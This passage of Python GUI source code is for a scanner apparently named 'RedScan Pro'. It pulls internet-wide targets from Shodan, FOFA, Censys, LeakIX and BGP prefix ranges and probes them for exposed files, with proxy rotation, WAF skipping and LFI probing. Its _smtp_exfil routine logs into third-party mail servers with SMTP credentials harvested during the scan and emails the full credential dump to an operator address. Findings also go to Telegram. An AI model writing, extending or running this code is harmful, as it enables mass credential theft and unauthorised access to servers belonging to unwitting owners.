            messagebox.showwarning("No Queries", "Enter at least one search query.")
            return
        _save_cfg({'shodan_key': key, 'shodan_queries': raw_q})
        self._fetch_stop.clear()
        self._fetch_pause.set()
        self._start_stream_scan(
            'Shodan', shodan_search,
            {'api_key': key, 'queries': queries,
             'stop_evt': self._fetch_stop, 'pause_evt': self._fetch_pause,
             'log_cb': self._log_ts},
        )

    def _fo_fetch_and_scan(self):
        email  = self._fo_email.get().strip()
        key    = self._fo_key.get().strip()
        raw_q  = self._fo_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines()
                   if l.strip() and not l.strip().startswith('#')]
        if not email or not key:
            messagebox.showwarning("Missing Credentials", "Enter FOFA email and API key.")
            return
        if not queries:
            messagebox.showwarning("No Queries", "Enter at least one search query.")
            return
        _save_cfg({'fofa_email': email, 'fofa_key': key, 'fofa_queries': raw_q})
        self._fetch_stop.clear()
        self._fetch_pause.set()
        self._start_stream_scan(
            'FOFA', fofa_search,
            {'email': email, 'api_key': key, 'queries': queries,
             'stop_evt': self._fetch_stop, 'pause_evt': self._fetch_pause,
             'log_cb': self._log_ts},
        )

    def _cn_fetch_and_scan(self):
        api_id  = self._cn_id.get().strip()
        api_sec = self._cn_secret.get().strip()
        raw_q   = self._cn_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines() if l.strip() and not l.startswith('#')]
        if not api_id or not api_sec:
            messagebox.showwarning("Missing Keys", "Enter your Censys API ID and Secret.")
            return
        _save_cfg({'censys_id': api_id, 'censys_secret': api_sec})
        self._fetch_stop.clear()
        self._start_stream_scan(
            'Censys', censys_search,
            {'api_id': api_id, 'api_secret': api_sec, 'queries': queries,
             'stop_evt': self._fetch_stop, 'log_cb': self._log_ts},
        )

    def _lx_fetch_and_scan(self):
        api_key = self._lx_key.get().strip()
        raw_q   = self._lx_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines() if l.strip() and not l.startswith('#')]
        self._fetch_stop.clear()
        self._start_stream_scan(
            'LeakIX', leakix_search,
            {'api_key': api_key, 'queries': queries,
             'stop_evt': self._fetch_stop, 'log_cb': self._log_ts},
        )


    def _on_fetch_done(self, source: str, targets: list, err: str | None):
        """Called on the main thread when a fetch completes or is stopped."""
        self._set_fetch_state(source, 'idle')
        status = self._sh_status if source == 'shodan' else self._fo_status

        if targets:
            self._osint_targets = targets
            stopped = self._fetch_stop.is_set()
            label   = "stopped early" if stopped else "fetched"
            status.configure(
                text=f"{'⚠' if stopped else '✓'}  {len(targets):,} targets {label} — ready to scan",
                text_color=C_WARN if stopped else C_FOUND,
            )
            self._log_found(f"[+] {len(targets):,} targets ready")
            # Enable Save IPs and Expand buttons for whichever panel just finished
            save_btn   = self._sh_save_btn   if source == 'shodan' else self._fo_save_btn
            expand_btn = self._sh_expand_btn if source == 'shodan' else self._fo_expand_btn
            save_btn.configure(state="normal",   fg_color="#12273d")
            expand_btn.configure(state="normal", fg_color="#0f2035")
        elif err:
            status.configure(text=f"Error: {err}", text_color=C_ERR)
            self._log_err(f"[!] {err}")
        else:
            status.configure(text="No results found", text_color=C_DIM)

    def _start_stream_scan(self, source: str, fetch_fn, fetch_kwargs: dict):
        """
        Streaming Fetch+Scan pipeline:
        1. Starts fetch in background, each new IP goes into a Queue
        2. Scanner reads from Queue immediately — no waiting for fetch to finish
        3. Each IP is auto-saved to extracted_ips/ as it arrives
        """
        paths = self._get_paths()
        if not paths:
            messagebox.showwarning("No Modules", "Enable at least one scan module.")
            return
        threads = int(self._thr_sl.get())
        timeout = int(self._to_sl.get())

        # Setup
        ip_queue = _queue.Queue()
        fetch_done_evt = threading.Event()
        self._stream_ip_queue    = ip_queue
        self._stream_fetch_done  = fetch_done_evt
        self._stream_source      = source
        self._stream_ip_count    = 0
        self._stream_ip_file     = None

        # Prepare results/extracted_ips auto-save file
        from saver import RESULTS_DIR
        from datetime import datetime as _dt
        ts = _dt.now().strftime('%Y%m%d_%H%M%S')
        ips_dir = os.path.join(os.path.abspath(RESULTS_DIR), 'extracted_ips')
        os.makedirs(ips_dir, exist_ok=True)
        ip_file = os.path.join(ips_dir, f'{source.lower()}_{ts}.txt')
        self._stream_ip_file = ip_file
        with open(ip_file, 'w', encoding='utf-8') as fh:
            fh.write(f"# {source.upper()} Extracted IPs — {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        seen: set = set()
        def yield_cb(url):
            if url in seen:
                return
            seen.add(url)
            ip_queue.put(url)
            # Auto-save
            try:
                with open(ip_file, 'a', encoding='utf-8') as fh:
                    fh.write(url + '\n')
            except Exception:
                pass
            self._stream_ip_count += 1
            count = self._stream_ip_count
            self.after(0, lambda c=count: self._update_stream_counter(source, c))

        # Reset scan state
        self._reset_cards()
        self._clear_log()
        self._clear_vuln_targets()
        self._progress.set(0)
        self._stat_lbl.configure(text="Fetching + Scanning…", text_color=C_WARN)
        self._start_btn.configure(state="disabled")
        self._pause_btn.configure(state="normal", text="▐▐  PAUSE",
                                   fg_color="#7c4f0e", hover_color="#a06512")
        self._stop_btn.configure(state="normal")

        self._log_dim("-" * 68)
        self._log_info(f"[*] STREAM MODE — {source}: fetching + scanning simultaneously")
        self._log_dim("-" * 68)

        self._rt_email = self._redteam_email.get().strip()
        _save_cfg({'redteam_email': self._rt_email})
        tg_notifier = None
        if self._tg_enabled_cb.get():
            tg_notifier = TelegramNotifier(
                token=self._tg_token.get().strip(),
                chat_id=self._tg_chatid.get().strip(),
                filter_cats=self._get_tg_filter(),
            )

        proxies = []
        if self._proxy_enable_cb.get():
            raw_px = self._proxy_box.get("0.0", "end").strip()
            proxies = [l.strip() for l in raw_px.splitlines()
                       if l.strip() and not l.strip().startswith('#')]

        self._scanner = Scanner(
            log_cb=self._log_ts,
            progress_cb=self._on_stream_progress,
            finding_cb=self._on_finding,
            stats_cb=self._on_stats,
            check_services=bool(self._svc_cb.get()),
            telegram=tg_notifier,
            proxies=proxies,
            skip_waf=bool(self._skipwaf_cb.get()),
            resume=False,
            redteam_email=self._rt_email,
            js_crawl=bool(self._js_crawl_cb.get()),
            lfi_probe=bool(self._lfi_probe_cb.get()),
            active_checks=bool(self._active_checks_cb.get()),
        )

        # Thread 1: fetch IPs → put in queue
        def fetch_worker():
            try:
                fetch_fn(**fetch_kwargs, yield_cb=yield_cb)
            finally:
                fetch_done_evt.set()
                self.after(0, lambda: self._log_info(
                    f"[*] {source} fetch complete — {self._stream_ip_count:,} IPs extracted"
                ))

        # Thread 2: scan from queue
        def scan_worker():
            try:
                self._scanner.scan_queue(ip_queue, paths, threads, timeout, fetch_done_evt)
            finally:
                self.after(0, self._on_done)

        threading.Thread(target=fetch_worker, daemon=True).start()
        threading.Thread(target=scan_worker, daemon=True).start()

    def _update_stream_counter(self, source: str, count: int):
        self._stat_lbl.configure(
            text=f"Streaming {source}: {count:,} IPs extracted, scanning…",
            text_color=C_WARN,
        )

    def _on_stream_progress(self, cur: int, tot: int):
        def _do():
            self._prog_lbl.configure(text=f"scanned: {cur}")
            self._stat_lbl.configure(
                text=f"Streaming {self._stream_source}: {self._stream_ip_count:,} extracted · {cur} scanned",
                text_color=C_WARN,
            )
        self.after(0, _do)

    # ══════════════════════════════════════════════════════════════════════════
    # LOG HELPERS
    # ══════════════════════════════════════════════════════════════════════════

    def _write_log(self, msg: str, tag: str):
        ts = datetime.now().strftime("%H:%M:%S")
        tw = self._log_box._textbox
        tw.configure(state="normal")
        tw.insert("end", f"[{ts}] ", "ts")
        tw.insert("end", msg + "\n", tag)
        tw.see("end")
        tw.configure(state="disabled")

    def _log_found(self,   msg: str): self._write_log(msg, "found")
    def _log_info(self,    msg: str): self._write_log(msg, "info")
    def _log_warn(self,    msg: str): self._write_log(msg, "warn")
    def _log_err(self,     msg: str): self._write_log(msg, "err")
    def _log_dim(self,     msg: str): self._write_log(msg, "dim")
    def _log_invalid(self,    msg: str): self._write_log(msg, "invalid")
    def _log_accessible(self, msg: str): self._write_log(msg, "accessible")
    def _log_probe(self,   msg: str): self._write_log(msg, "probe")

    def _log_ts(self, msg: str):
        """Thread-safe: appends to deque; _flush_log drains it on the main thread."""
        self._log_q.append(msg)

    def _flush_log(self):
        """Drain up to 40 pending log messages per 150 ms tick — keeps UI responsive."""
        for _ in range(min(40, len(self._log_q))):
            if not self._log_q:
                break
            msg = self._log_q.popleft()
            if "✗" in msg:
                self._log_invalid(msg)
            elif "? ACCESSIBLE" in msg:
                self._log_accessible(msg)
            elif "[+]" in msg:
                self._log_found(msg)
            elif "[!]" in msg:
                self._log_warn(msg)
            elif "error" in msg.lower():
                self._log_err(msg)
            elif msg.startswith("-") or msg.startswith("="):
                self._log_dim(msg)
            elif msg.strip().startswith("· "):
                self._log_probe(msg)
            elif msg.strip().startswith("→ ") or msg.strip().startswith("↪ "):
                self._log_dim(msg)
            elif msg.strip().startswith("! ") or msg.strip().startswith("!! "):
                self._log_warn(msg)
            else:
                self._log_info(msg)
        self.after(150, self._flush_log)   # reschedule

    def _clear_log(self):
        tw = self._log_box._textbox
        tw.configure(state="normal")
        tw.delete("1.0", "end")
        tw.configure(state="disabled")

    def _save_log(self):
        fp = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text", "*.txt")],
            initialfile=f"scan_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
        )
        if fp:
            content = self._log_box._textbox.get("1.0", "end")
            with open(fp, 'w', encoding='utf-8') as f:
                f.write(content)

    # ══════════════════════════════════════════════════════════════════════════
    # HELPERS
    # ══════════════════════════════════════════════════════════════════════════

    def _upload(self):
        fp = filedialog.askopenfilename(
            title="Select URL / IP list",
            filetypes=[("Text", "*.txt"), ("All", "*.*")],
        )
        if fp:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            self._target_box.delete("0.0", "end")
            self._target_box.insert("0.0", content)
            count = len([l for l in content.splitlines() if l.strip() and not l.startswith('#')])
            self._target_count_lbl.configure(text=f"{count} targets loaded")
            self._log_info(f"[*] Loaded: {fp}")

    def _clear_targets(self):
        self._target_box.delete("0.0", "end")
        self._target_count_lbl.configure(text="")

    def _get_targets(self) -> list[str]:
        src = self._active_source
        if src in ("Shodan", "FOFA"):
            return list(self._osint_targets)
        if src == "BGP":
            return list(self._bgp_targets)
        if src == "Censys":
            return list(self._censys_targets)
        if src == "LeakIX":
            return list(self._leakix_targets)
        if src == "CRT.SH":
            return list(self._crtsh_targets)
        import ipaddress
        raw = self._target_box.get("0.0", "end").strip()
        targets = []
        for line in raw.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            # Expand CIDR ranges (e.g. 192.168.1.0/24) into individual IPs
            if '/' in line and not line.startswith('http'):
                try:
                    net = ipaddress.ip_network(line, strict=False)
                    targets.extend(str(ip) for ip in net.hosts())
                    continue
                except ValueError:
                    pass
            targets.append(line)
        return list(dict.fromkeys(targets))  # deduplicate, preserve order

    def _get_paths(self) -> list[str]:
        paths = []
        for key, cb in self._mod.items():
            if cb.get():
                paths.extend(PATH_MODULES.get(key, []))
        return list(dict.fromkeys(paths))

    def _reset_cards(self):
        for key in self._counts:
            self._counts[key] = 0
        for card in self._cards.values():
            card.reset()

    # ══════════════════════════════════════════════════════════════════════════
    # SCAN CONTROL
    # ══════════════════════════════════════════════════════════════════════════

    def _start(self):
        targets = self._get_targets()
        if not targets:
            src = self._source_seg.get()
            hint = ("Fetch targets from Shodan first." if src == "Shodan"
                    else "Fetch targets from FOFA first." if src == "FOFA"
                    else "Enter at least one URL or IP.")
            messagebox.showwarning("No Targets", hint)
            return

        paths = self._get_paths()
        if not paths:
            messagebox.showwarning("No Modules", "Enable at least one scan module.")
            return

        threads = int(self._thr_sl.get())
        timeout = int(self._to_sl.get())

        self._reset_cards()
        self._clear_log()
        self._clear_vuln_targets()
        self._progress.set(0)
        self._stat_lbl.configure(text="Starting…", text_color=C_WARN)
        self._detail_lbl.configure(text="")

        self._start_btn.configure(state="disabled")
        self._pause_btn.configure(state="normal",  text="▐▐  PAUSE",
                                   fg_color="#7c4f0e", hover_color="#a06512")
        self._stop_btn.configure(state="normal")

        self._log_dim("-" * 68)
        self._log_info(f"[*] Targets  : {len(targets)}")
        self._log_info(f"[*] Paths    : {len(paths)}")
        self._log_info(f"[*] Threads  : {threads}  |  Timeout: {timeout}s")
        self._log_dim("-" * 68)

        self._rt_email = self._redteam_email.get().strip()
        self._last_target_count = len(targets)
        _save_cfg({'redteam_email': self._rt_email})

        # Build Telegram notifier if enabled
        tg_notifier = None
        if self._tg_enabled_cb.get():
            tg_notifier = TelegramNotifier(
                token=self._tg_token.get().strip(),
                chat_id=self._tg_chatid.get().strip(),
                filter_cats=self._get_tg_filter(),
            )
            tg_notifier.send_startup(
                f"Targets: {len(targets):,}  ·  Paths: {len(paths):,}  "
                f"·  Threads: {threads}"
            )
        self._tg_save_config()

        # Proxy pool
        proxies = []
        if self._proxy_enable_cb.get():
            raw_px = self._proxy_box.get("0.0", "end").strip()
            proxies = [l.strip() for l in raw_px.splitlines()
                       if l.strip() and not l.strip().startswith('#')]
            if proxies:
                self._log_info(f"[*] Proxy pool: {len(proxies)} proxies loaded")
            else:
                self._log_warn("[!] Proxy rotation enabled but no proxies found")

        do_internetdb = bool(self._internetdb_cb.get()) and bool(targets)
        _check_svcs   = bool(self._svc_cb.get())
        _skip_waf     = bool(self._skipwaf_cb.get())
        _resume       = bool(self._resume_cb.get())

        # All heavy work (InternetDB filter + scan) runs in a background thread
        # so the main thread never blocks and the UI stays responsive.
        _targets = list(targets)

        # ── Activity log file — auto-created for every scan ──────────────────
        import os as _os, sys as _sys
        from datetime import datetime as _dt
        # Use exe directory when frozen, source directory otherwise
        _exe_dir = (_os.path.dirname(_sys.executable)
                    if getattr(_sys, 'frozen', False)
                    else _os.path.dirname(_os.path.abspath(__file__)))
        _log_dir = _os.path.join(_exe_dir, 'results', 'logs')
        _os.makedirs(_log_dir, exist_ok=True)
        _log_path = _os.path.join(_log_dir,
                                  f"scan_{_dt.now().strftime('%Y%m%d_%H%M%S')}.log")
        _log_fh   = open(_log_path, 'w', encoding='utf-8', buffering=1)

        def _file_log(msg):
            try:
                _log_fh.write(f"[{_dt.now().strftime('%H:%M:%S')}] {msg}\n")
            except Exception:
                pass

        # Seed the log with scan header
        _file_log(f"=== SCAN START  targets={len(_targets)}  paths={len(paths)} ===")
        self._log_info(f"[*] Log: {_log_path}")

        def _run():
            t = _targets
            # InternetDB pre-filter (off main thread — makes HTTP requests)
            if do_internetdb:
                self._log_ts(f"[*] InternetDB pre-filter: checking {len(t)} targets…")
                _file_log(f"[*] InternetDB pre-filter: checking {len(t)} targets…")
                from osint import internetdb_prefilter
                t = internetdb_prefilter(t, log_cb=self._log_ts)
                self._log_ts(f"[*] Post-filter: {len(t)} targets remain")
                _file_log(f"[*] Post-filter: {len(t)} targets remain")
                self.after(0, lambda n=len(t): setattr(self, '_last_target_count', n))
                if not t:
                    def _empty():
                        self._stat_lbl.configure(text="Ready", text_color="#334155")
                        self._start_btn.configure(state="normal")
                        self._pause_btn.configure(state="disabled")
                        self._stop_btn.configure(state="disabled")
                        messagebox.showwarning(
                            "No Targets",
                            "All targets filtered out by InternetDB pre-filter.",
                        )
                    self.after(0, _empty)
                    _file_log("[*] All targets filtered — scan aborted")
                    _log_fh.close()
                    return

            scanner = Scanner(
                log_cb=self._log_ts,
                progress_cb=self._on_progress,
                finding_cb=self._on_finding,
                stats_cb=self._on_stats,
                check_services=_check_svcs,
                telegram=tg_notifier,
                proxies=proxies,
                skip_waf=_skip_waf,
                resume=_resume,
                redteam_email=self._rt_email,
                js_crawl=bool(self._js_crawl_cb.get()),
                lfi_probe=bool(self._lfi_probe_cb.get()),
                active_checks=bool(self._active_checks_cb.get()),
                file_log_cb=_file_log,
            )
            self._scanner = scanner
            try:
                scanner.scan_all(t, paths, threads, timeout)
            finally:
                _file_log(
                    f"=== SCAN DONE  checked={scanner.checked:,}  "
                    f"found={scanner.found} ==="
                )
                _log_fh.close()
                self.after(0, self._on_done)

        self._scan_thread = threading.Thread(target=_run, daemon=True)
        self._scan_thread.start()

    def _toggle_pause(self):
        if self._scanner is None:
            return
        if self._scanner.is_paused:
            self._scanner.resume()
            self._pause_btn.configure(text="▐▐  PAUSE",
                                      fg_color="#7c4f0e", hover_color="#a06512")
            self._stat_lbl.configure(text="Scanning…", text_color=C_WARN)
            self._log_info("[*] Scan resumed")
        else:
            self._scanner.pause()
            self._pause_btn.configure(text="▶  RESUME",
                                      fg_color="#14532d", hover_color="#166534")
            self._stat_lbl.configure(text="Paused", text_color=C_WARN)
            self._log_warn("[!] Scan paused")

    def _stop(self):
        if self._scanner:
            self._scanner.stop()
            self._log_warn("[!] Stop requested…")
        self._bgp_scan_stop.set()   # also halts any running BGP direct scan
        self._stop_btn.configure(state="disabled")
        self._pause_btn.configure(state="disabled")

    # ── Callbacks from scanner (always dispatched via self.after) ─────────────

    def _on_progress(self, cur: int, tot: int):
        def _do():
            pct = cur / tot if tot else 0
            self._progress.set(pct)
            self._prog_lbl.configure(text=f"{cur}/{tot}")
            self._stat_lbl.configure(text=f"Scanning…  {int(pct * 100)}%",
                                      text_color=C_WARN)
        self.after(0, _do)

    def _on_stats(self, checked: int, found: int):
        def _do():
            self._detail_lbl.configure(
                text=f"Checked: {checked:,}  ·  Found: {found}",
                text_color="#475569",
            )
        self.after(0, _do)

    def _on_finding(self, finding: dict):
        ftype = finding['type']
        url   = finding.get('url', '')
        data  = finding.get('data', {}) if isinstance(finding.get('data'), dict) else {}
        validated = data.get('validated')

        def _do():
            self._counts[ftype] = self._counts.get(ftype, 0) + 1
            card = self._cards.get(ftype)
            if card:
                card.hit(self._counts[ftype])
            # Add to vuln targets list for confirmed or accessible findings
            if validated is not False and url:
                entry = f"[{ftype.upper():<12}]  {url}\n"
                if entry not in self._vuln_targets:
                    self._vuln_targets.append(entry)
                    self._vuln_box.configure(state="normal")
                    self._vuln_box.insert("end", entry)
                    self._vuln_box.see("end")
                    self._vuln_box.configure(state="disabled")
        self.after(0, _do)
        # Only send exfil report if credentials were already confirmed valid in the scan thread
        if ftype == 'mail' and self._rt_email and data.get('validated') is True:
            threading.Thread(
                target=self._smtp_exfil,
                args=(finding, self._rt_email),
                daemon=True,
            ).start()

    def _smtp_exfil(self, finding: dict, redteam_email: str):
        """
        Send a credential report to the red team email using the validated SMTP creds.
        Authentication was already confirmed by _validate_env_finding in the scan thread;
        this function only handles the email send and logs the outcome.
        """
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from datetime import datetime as _dt

        data = finding.get('data', {})
        host = data.get('MAIL_HOST') or data.get('SMTP_HOST', '')
        try:
            port = int(data.get('MAIL_PORT') or data.get('SMTP_PORT') or 587)
        except (ValueError, TypeError):
            port = 587
        user = data.get('MAIL_USERNAME') or data.get('SMTP_USERNAME', '')
        pwd  = data.get('MAIL_PASSWORD') or data.get('SMTP_PASSWORD', '')

        if not all([host, user, pwd]):
            return

        # Use the confirmed port and encryption method from the validator result
        smtp_auth = data.get('smtp_auth', '')
        if data.get('smtp_port'):
            try:
                port = int(data['smtp_port'])
            except (ValueError, TypeError):
                pass
        use_ssl = smtp_auth.lower().startswith('ssl')
        use_tls = smtp_auth.lower().startswith('tls')

        try:
            msg = MIMEMultipart()
            msg['From']    = user
            msg['To']      = redteam_email
            msg['Subject'] = f"[RedScan] VALID SMTP — {finding['url']}"

            lines = [
                "RedScan Pro — VALID SMTP Credential Capture",
                "=" * 60,
                f"Target   : {finding['url']}{finding['path']}",
                f"Captured : {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}",
                f"Server   : {host}:{port}",
                f"Status   : AUTHENTICATED SUCCESSFULLY",
                "",
                "Full Credentials:",
            ]
            for k, v in data.items():
                lines.append(f"  {k}: {v}")
            msg.attach(MIMEText("\n".join(lines), 'plain'))

            if use_ssl:
                with smtplib.SMTP_SSL(host, port, timeout=15) as s:
                    s.ehlo()
                    s.login(user, pwd)
                    s.sendmail(user, redteam_email, msg.as_string())
            else:
                with smtplib.SMTP(host, port, timeout=15) as s:
                    s.ehlo()
                    if use_tls:
                        s.starttls()
                        s.ehlo()
                    s.login(user, pwd)
                    s.sendmail(user, redteam_email, msg.as_string())

            self.after(0, lambda: self._log_found(
                f"  [SMTP EXFIL] {user} @ {host}:{port}  →  report sent to {redteam_email}"
            ))

        except smtplib.SMTPAuthenticationError:
            self.after(0, lambda: self._log_warn(
                f"  [SMTP EXFIL] {user} @ {host}:{port} — auth failed on send attempt"
            ))
        except Exception as e:
            self.after(0, lambda e=e: self._log_warn(
                f"  [SMTP EXFIL ERROR] {host}:{port} — {e}"
            ))

    def _load_proxy_file(self):
        fp = filedialog.askopenfilename(
            title="Select proxy list",
            filetypes=[("Text", "*.txt"), ("All", "*.*")],
        )
        if fp:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            self._proxy_box.delete("0.0", "end")
            self._proxy_box.insert("0.0", content)
            count = len([l for l in content.splitlines()
                         if l.strip() and not l.strip().startswith('#')])
            self._log_info(f"[*] Loaded {count} proxies from: {fp}")

    def _clear_checkpoint_ui(self):
        from scanner_core import _clear_checkpoint
        _clear_checkpoint()
        messagebox.showinfo("Checkpoint", "Checkpoint cleared. Next scan will start fresh.")
        self._log_info("[*] Scan checkpoint cleared")

    def _on_done(self):
        self._start_btn.configure(state="normal")
        self._pause_btn.configure(state="disabled")
        self._stop_btn.configure(state="disabled")
        self._progress.set(1.0)
        total = sum(self._counts.values())
        self._stat_lbl.configure(text="Complete", text_color=C_FOUND)
        self._log_found(f"[+] Finished — {total} finding(s)")
        self._log_info(f"[*] Results: {os.path.abspath(RESULTS_DIR)}")
        if self._stream_ip_file and os.path.exists(self._stream_ip_file):
            self._log_info(f"[*] IPs saved: {self._stream_ip_file}")
        if self._scanner and self._scanner._telegram:
            self._scanner._telegram.send_summary(total, self._last_target_count)

    def _save_fetched_ips(self, source: str):
        if not self._osint_targets:
            messagebox.showinfo("Save IPs", "No fetched targets to save.")
            return
        ips_dir = os.path.join(os.path.abspath(RESULTS_DIR), "extracted_ips")
        os.makedirs(ips_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(ips_dir, f"{source}_{ts}.txt")
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(f"# SB-Scanner — Fetched Targets ({source.upper()})\n")
                f.write(f"# Saved: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total: {len(self._osint_targets)}\n")
                f.write("=" * 60 + "\n\n")
                for t in self._osint_targets:
                    f.write(t + "\n")
            messagebox.showinfo("Saved", f"Saved {len(self._osint_targets):,} IPs/URLs to:\n{path}")
        except Exception as e:
            messagebox.showerror("Error", f"Could not save file:\n{e}")

    def _save_vuln_targets(self):
        if not self._vuln_targets:
            messagebox.showinfo("Save List", "No vuln targets to save yet.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="vuln_targets.txt",
            title="Save Vuln Targets List",
        )
        if not path:
            return
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(f"# SB-Scanner — Vuln Targets\n")
                f.write(f"# Saved: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                f.writelines(self._vuln_targets)
            messagebox.showinfo("Saved", f"Saved {len(self._vuln_targets)} target(s) to:\n{path}")
        except Exception as e:
            messagebox.showerror("Error", f"Could not save file:\n{e}")

    def _clear_vuln_targets(self):
        self._vuln_targets.clear()
        self._vuln_box.configure(state="normal")
        self._vuln_box.delete("1.0", "end")
        self._vuln_box.configure(state="disabled")

    def _open_results(self):
        path = os.path.abspath(RESULTS_DIR)
        os.makedirs(path, exist_ok=True)
        subprocess.Popen(f'explorer "{path}"')

    # ══════════════════════════════════════════════════════════════════════════
    # BGP PANEL
    # ══════════════════════════════════════════════════════════════════════════

    def _mk_bgp(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        cfg = self._cfg

        # ── Provider ASN checkboxes ──────────────────────────────────────────
        _sec(f, "PROVIDER ASNs  (BGP data source)")
        self._bgp_asn_cbs: dict[str, ctk.CTkCheckBox] = {}
        asn_grid = ctk.CTkFrame(f, fg_color="transparent")
        asn_grid.pack(fill="x", padx=10, pady=(0, 6))
        for i, name in enumerate(DEFAULT_ASNS.keys()):
            cb = ctk.CTkCheckBox(
                asn_grid, text=name,
                font=ctk.CTkFont(size=10),
                checkmark_color=BG_APP, fg_color=A, hover_color="#00aed4",
                width=130,
            )
            cb.grid(row=i // 2, column=i % 2, padx=4, pady=2, sticky="w")
            cb.select()
            self._bgp_asn_cbs[name] = cb
        asn_grid.grid_columnconfigure(0, weight=1)
        asn_grid.grid_columnconfigure(1, weight=1)

        # ── Custom CIDRs ─────────────────────────────────────────────────────
        _sec(f, "CUSTOM CIDRs  (optional, one per line)")
        self._bgp_custom_cidrs = ctk.CTkTextbox(
            f, height=50, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=BG_INP, text_color="#c9d1d9", wrap="none",
        )
        self._bgp_custom_cidrs.pack(fill="x", padx=10, pady=(0, 6))

        # ── Pipeline mode info ────────────────────────────────────────────────
        ctk.CTkLabel(
            f,
            text="⚡  Fetch → Probe → Scan simultaneously  ·  Runs until stopped\n"
                 "    Uses global Scan Timeout for liveness probing",
            font=ctk.CTkFont(size=10),
            text_color="#475569",
            justify="left",
        ).pack(fill="x", padx=12, pady=(4, 8))

        # ── Step 1: Load prefixes ────────────────────────────────────────────
        r1 = ctk.CTkFrame(f, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=(2, 3))
        self._bgp_load_btn = ctk.CTkButton(
            r1, text="① Load BGP Prefixes",
            command=self._bgp_load_prefixes,
            fg_color="#12273d", hover_color="#1a3654", height=30,
            font=ctk.CTkFont(size=11, weight="bold"),
        )
        self._bgp_load_btn.pack(side="left", fill="x", expand=True)

        # ── Step 2: START pipeline (probe → scan → validate → telegram) ────────
        r2 = ctk.CTkFrame(f, fg_color="transparent")
        r2.pack(fill="x", padx=10, pady=(0, 3))
        self._bgp_scan_btn = ctk.CTkButton(
            r2, text="② START BGP SCAN  ▶",
            command=self._bgp_pipeline_start,
            fg_color="#14532d", hover_color="#166534",
            height=36,
            font=ctk.CTkFont(size=13, weight="bold"),
            state="disabled",
        )
        self._bgp_scan_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self._bgp_scan_stop_btn = ctk.CTkButton(
            r2, text="⬛ Stop", width=64, height=36,
            command=self._bgp_pipeline_stop,
            fg_color="#7f1d1d", hover_color="#991b1b",
            font=ctk.CTkFont(size=11), state="disabled",
        )
        self._bgp_scan_stop_btn.pack(side="right")

        # ── Status ────────────────────────────────────────────────────────────
        bgp_bot = ctk.CTkFrame(f, fg_color="transparent")
        bgp_bot.pack(fill="x", padx=10, pady=(0, 4))
        self._bgp_status = ctk.CTkLabel(
            bgp_bot, text="Load BGP prefixes to begin",
            font=ctk.CTkFont(size=10), text_color="#4b5563",
        )
        self._bgp_status.pack(side="left", fill="x", expand=True)
        self._bgp_save_btn = ctk.CTkButton(
            bgp_bot, text="💾 Save IPs", width=80, height=24,
            fg_color="#12273d", hover_color="#1a3654",
            font=ctk.CTkFont(size=10), state="disabled",
            command=self._bgp_save_ips,
        )
        self._bgp_save_btn.pack(side="right")

        # ── Top ranges display (shows hottest /24s) ──────────────────────────
        _sec(f, "TOP RANGES  (most productive /24s)")
        self._bgp_ranges_box = ctk.CTkTextbox(
            f, height=60, font=ctk.CTkFont(family="Consolas", size=10),
            fg_color=BG_INP, text_color="#94a3b8", state="disabled",
        )
        self._bgp_ranges_box.pack(fill="x", padx=10, pady=(0, 8))

        return f

    def _bgp_load_prefixes(self):
        selected_asns = {
            name: asns
            for name, asns in DEFAULT_ASNS.items()
            if name in self._bgp_asn_cbs and self._bgp_asn_cbs[name].get()
        }
        if not selected_asns:
            from tkinter import messagebox
            messagebox.showwarning("No ASNs", "Select at least one provider ASN.")
            return

        self._bgp_load_btn.configure(state="disabled", text="Loading…")
        self._bgp_status.configure(text="Fetching BGP prefix data…", text_color=C_WARN)
        self._log_info("[BGP] Fetching prefix data from BGPView / RIPE…")

        def _run():
            gen = SmartIPGenerator()
            prefixes = fetch_all_bgp_prefixes(
                asns=selected_asns, log_cb=self._log_ts,
            )
            # Add any manual CIDRs
            raw_cidrs = self._bgp_custom_cidrs.get("0.0", "end").strip()
            custom = [c.strip() for c in raw_cidrs.splitlines() if c.strip()]
            gen.load_from_prefixes(prefixes, log_cb=self._log_ts)
            if custom:
                gen.seed_cidrs(custom)
                self._log_ts(f"[BGP] Seeded {len(custom)} custom CIDR(s)")

            self._bgp_generator = gen
            total_ips = gen._total
            n_cidrs   = len(gen._cidrs)
            self.after(0, lambda: self._bgp_on_loaded(n_cidrs, total_ips))

        threading.Thread(target=_run, daemon=True).start()

    def _bgp_on_loaded(self, n_cidrs: int, total_ips: int):
        self._bgp_load_btn.configure(state="normal", text="① Load BGP Prefixes")
        self._bgp_scan_btn.configure(state="normal")
        self._bgp_status.configure(
            text=f"✓ {n_cidrs:,} CIDRs  ·  {total_ips:,} IPs in pool  —  ready",
            text_color=C_FOUND,
        )
        self._log_found(f"[BGP] Ready — {n_cidrs:,} CIDRs, {total_ips:,} total IPs")

    # ══════════════════════════════════════════════════════════════════════════
    # BGP PIPELINE  (DeadScan-style: produce → probe → scan → validate → tg)
    # ══════════════════════════════════════════════════════════════════════════

    def _bgp_pipeline_start(self):
